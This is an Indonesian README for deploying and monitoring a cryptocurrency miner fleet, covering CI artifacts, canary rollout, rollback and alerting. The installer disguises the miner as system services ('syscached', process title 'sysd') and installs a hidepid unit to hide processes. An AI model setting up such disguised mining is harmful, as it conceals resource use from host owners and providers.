# ops/fleet — deploy & monitoring fleet xcb CONN

Skrip untuk fleet miner (fl + ai-workers-1..4). Daftar host **tidak** disimpan
di repo (repo publik); simpan di `~/.config/xcb/fleet.hosts`.

## Setup

```bash
mkdir -p ~/.config/xcb
cp ops/fleet/hosts.conf.example ~/.config/xcb/fleet.hosts
$EDITOR ~/.config/xcb/fleet.hosts
```

Format: `nama=alamat`, dengan `local` untuk host tempat skrip dijalankan.
Unit systemd dan environment file contoh ada di
[`../systemd/`](../systemd/README.md). `deploy.sh` hanya mengganti binary +
library; unit `syscached` dikelola terpisah.

## Artefak build (glibc 2.35 / Ubuntu 22.04)

Worker memakai Ubuntu 22.04 (glibc 2.35), `fl` 24.04. Binary yang dibuild di
22.04 jalan di keduanya, jadi itu satu-satunya artefak deploy.

CI job `build-2204` membuild + upload artefak `xcb-2204` (`xcb`,
`librandomx_v2.so`, `VERSION`, `SHA256SUMS`) pada setiap push ke `main`.
`deploy.sh --from-ci` memverifikasi isi artefak dengan
`sha256sum -c SHA256SUMS` sebelum staging; artefak tanpa manifest (mis. hasil
build lokal) hanya dicatat dan tidak diverifikasi.

## Deploy

```bash
cd ops/fleet
./deploy.sh --from-ci --expect <commit>   # artefak CI run main terakhir
./deploy.sh --from ../../build            # artefak lokal
./deploy.sh --only fl --dry-run           # lihat rencana
```

Alur per host: stop → backup (`xcb.bak-STAMP`) → install → cek `ldd` +
`--version` → start → tunggu `RandomX V2 siap`. Kalau ada yang gagal,
rollback otomatis dan deploy berhenti — host lain tidak disentuh.

Host pertama adalah canary. Setelah canary OK, sisanya jalan berurutan.

Rollback manual:

```bash
./deploy.sh --rollback              # backup terbaru di tiap host
./deploy.sh --rollback 20261105-112843
```

## Rilis tarball dan VPS baru

Tag `v*` memicu job `release`: artefak `xcb-2204` dikemas menjadi
`xcb-<tag>-linux-x86_64.tar.gz` (+ `.sha256`) berisi `xcb`,
`librandomx_v2.so`, `VERSION`, `SHA256SUMS`, `install.sh`,
`syscached.service`, dan `miner.env.example`.

```bash
git tag v1.0.0
git push origin v1.0.0
```

Di VPS baru:

```bash
curl -fLO https://github.com/ylxai/xcb-v2/releases/download/v1.0.0/xcb-v1.0.0-linux-x86_64.tar.gz
curl -fLO https://github.com/ylxai/xcb-v2/releases/download/v1.0.0/xcb-v1.0.0-linux-x86_64.tar.gz.sha256
sha256sum -c xcb-v1.0.0-linux-x86_64.tar.gz.sha256
tar xzf xcb-v1.0.0-linux-x86_64.tar.gz
sudo ./install.sh --wallet <alamat> --worker <nama>
```

`install.sh` memasang binary + library ke `/usr/local/bin`, menulis
`/etc/xcb/miner.env` (0600, termasuk `XCB_TITLE=sysd`), menyiapkan hugepages,
menulis wrapper `/usr/local/sbin/sysd` (0700), memasang unit, memasang
`xcb-proc-hidepid.service` + drop-in `10-hidepid.conf`, lalu menjalankan
`syscached`. `--dry-run` mencetak rencana tanpa mengubah apa pun. Sebelum
menimpa, `install.sh` membackup binary, library, dan unit lama dengan akhiran
`-<stamp>` dan mencetak perintah rollback satu baris. Ganti unit di host fleet
lewat `install.sh`, bukan `deploy.sh`: `apply.sh rollback` (dipakai
`deploy.sh --rollback`) hanya mengembalikan binary + library.

Urutan rollback aman: **pulihkan unit dulu**, baru binary + library. Kalau
`apply.sh rollback` dipulihkan lebih dulu sementara unit wrapper masih aktif,
binary pra-PR #20 start tanpa `CONN_POOL` yang bisa dipakai dan service gagal
sampai unit lama dikembalikan.

```bash
# 1. unit lama dulu
sudo install -m 0644 /etc/systemd/system/syscached.service.bak-<stamp> \
    /etc/systemd/system/syscached.service
sudo systemctl daemon-reload
# 2. baru binary + library
sudo ./deploy.sh --rollback        # atau apply.sh rollback
```

`install.sh` adalah installer penuh: ia juga memasang `xcb` dan
`librandomx_v2.so` dari tarball, jadi pakai tarball rilis yang cocok atau
pasang unit + wrapper secara manual.
Kalau `install.sh` sudah ada di host, `--version v1.0.0` (atau `latest`)
membuatnya mengunduh dan memverifikasi tarball rilis itu sendiri.

## Monitoring

```bash
./watch.sh --dry-run       # lihat hasil tanpa kirim alert
./watch.sh --test-alert    # uji channel alert
```

Cron tiap 5 menit:

```cron
*/5 * * * * $HOME/xcb-build/ops/fleet/watch.sh >> $HOME/xcb-watch.log 2>&1
```

Konfigurasi `~/.config/xcb/watch.env` (lihat `watch.env.example`):

```sh
ALERT_WEBHOOK="https://discord.com/api/webhooks/.../..."
# atau Telegram:
ALERT_TELEGRAM_TOKEN="123:abc"
ALERT_TELEGRAM_CHAT="123456789"
MIN_HR=400
MAX_REJECT_PCT=5
REJECT_MIN_DELTA=20
RECONNECT_LIMIT=3
```

Webhook menerima JSON `{"content": "...", "text": "..."}` — `content` untuk
Discord, `text` untuk Slack.

Yang dicek per host:

- service `syscached` harus `active`;
- ada log `HR` dalam 4 menit terakhir (mendeteksi miner hang);
- HR di bawah `MIN_HR`;
- reject rate di atas `MAX_REJECT_PCT`, dihitung dari **delta counter A/R
  sejak cek sebelumnya** (bukan total seumur proses), minimal
  `REJECT_MIN_DELTA` share dalam jendela;
- reconnect / login gagal lebih dari `RECONNECT_LIMIT` per 15 menit;
- `TLS verifikasi gagal` (langsung alert);
- fallback ke `regular pages` (hugepages tidak terpakai).

Alert di-cooldown 30 menit per host, dan mengirim pesan "pulih" saat host
kembali normal. Cooldown hanya maju bila pesan benar-benar terkirim;
pengiriman yang gagal dicoba lagi pada run berikutnya.

## Troubleshooting

- **`GLIBC_2.38 not found`** — artefak dibuild di 24.04. Pakai `--from-ci`
  (job `build-2204`) atau build di host 22.04.
- **`librandomx_v2.so: cannot open shared object file`** — library tidak ada
  di samping binary. `apply.sh` mengecek `ldd` dan otomatis rollback.
- **Deploy berhenti di canary** — cek output host tersebut; host lain belum
  disentuh. Perbaiki, lalu ulangi `--only <host>`.
